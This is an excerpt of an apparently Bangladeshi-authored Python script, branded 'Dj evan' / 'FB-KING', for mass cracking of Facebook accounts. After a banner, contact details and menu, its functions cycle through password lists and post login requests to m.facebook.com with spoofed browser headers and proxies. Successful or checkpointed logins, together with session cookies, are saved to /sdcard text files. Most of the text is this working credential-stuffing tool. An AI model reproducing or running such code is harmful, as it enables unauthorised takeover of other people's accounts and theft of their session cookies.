...
\_______/  \______/        \_______|   \_/    \_______|\__|  \__|
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} EVAN-KHAN               {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}dJ ARMY           {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+880191#***#64          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/DJ Dj evanarmy0033{N}    {H}  ║
...
def mainx():
    ...
    print(f'{K} [{H}8{K}] {N}Contract Dj evan ARMY')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/Dj evanarmy0033");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://facebook.com/groups/412641030225365/");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/Dj evan.Army00");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.Dj evan/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/Dj evan.Army00");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/Dj evan.txt');print(led)
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mDj evan","\x1b[1;92mDj evan","\x1b[1;93mDj evan","\x1b[1;94mDj evan","\x1b[1;95mDj evan","\x1b[1;96mDj evan","\x1b[1;97mDj evan","\x1b[1;91mDj evan","\x1b[1;92mDj evan","\x1b[1;93mDj evan","\x1b[1;94mDj evan","\x1b[1;95mDj evan","\x1b[1;96mDj evan"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mDj evan-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/Dj evan-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}Dj evan-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/Dj evan-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mDj evan-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/Dj evan-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/Dj evan-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
...
def f1(idf,pwv):
  ...
  for pw in pwv:
    try:
      ...
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
      po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [Dj evan-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/Dj evan-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mDj evan-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/Dj evan-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
